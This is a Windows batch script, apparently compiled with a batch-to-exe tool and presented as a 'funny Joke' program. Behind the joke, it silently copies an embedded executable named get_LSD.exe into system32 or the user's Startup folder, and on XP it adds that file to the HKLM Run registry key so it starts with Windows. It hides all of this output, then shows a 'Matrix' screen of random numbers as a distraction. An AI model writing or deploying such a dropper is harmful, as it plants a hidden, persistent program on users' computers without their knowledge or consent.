REM  QBFC Project Options Begin
REM  HasVersionInfo: Yes
REM  Companyname: Quick_Wango .::CODING::.
REM  Productname: Joke_Programm
REM  Filedescription: funny Joke
REM  Copyrights: 
REM  Trademarks: 
REM  Originalname: 
REM  Comments: too funny...
REM  Productversion:  1. 0. 0. 0
REM  Fileversion:  1. 0. 0. 0
REM  Internalname: 
REM  Appicon: C:\Users\PhiYas\Desktop\icon.ico
REM  Embeddedfile: C:\Users\PhiYas\Desktop\skripte\get_LSD.exe
REM  QBFC Project Options End

@echo off
title Joke_Programm v2.0.3.234 Build 1082
echo Auf LOS (Beliebige Taste) gehts los!!!! :D
:: --Autostart--

for /f "delims=.[ tokens=2" %%a in ('ver') do set osversion=%%a
if "%osversion%"=="Version 6" (goto vista) else goto xp

:xp
xcopy "%myfiles%\get_LSD.exe" "%windir%\system32\" /y  1>nul 2>nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupManagement" /t "REG_SZ" /d "%windir%\system32\get_LSD.exe" /f 1>nul 2>nul
goto done

:vista
set vista_dir=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
xcopy "%myfiles%\get_LSD.exe" "%vista_dir%" /y  1>nul 2>nul

:done
cls
color CA

:: --Matrixloop--
:loop
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
goto loop

:: --End of File--
